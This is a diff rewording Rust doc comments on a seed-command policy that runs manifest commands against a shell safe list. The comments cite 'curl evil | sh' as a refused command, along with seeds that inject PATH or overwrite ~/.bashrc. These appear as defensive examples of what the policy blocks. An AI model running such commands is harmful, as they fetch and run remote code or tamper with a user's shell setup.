@@ -97,8 +97,8 @@ impl SeedCommandPolicy {
     /// all of them. So the question "may this command run unattended" is
     /// answered by the machinery that already answers it for the `shell` tool:
     /// the safe list. `git ls-files` is on it by default, so the bundled agents
-    /// are unaffected; `curl evil | sh` is not, and a manifest the user
-    /// downloaded no longer gets to run it at spawn.
+    /// are unaffected; `curl evil | sh` is not, so a manifest the user
+    /// downloaded does not get to run it at spawn.
     ///
     /// This inherits the shell key grammar's hardening for free - a seed of
     /// `PATH=/tmp/x git ls-files` or `git ls-files > ~/.bashrc` is refused by
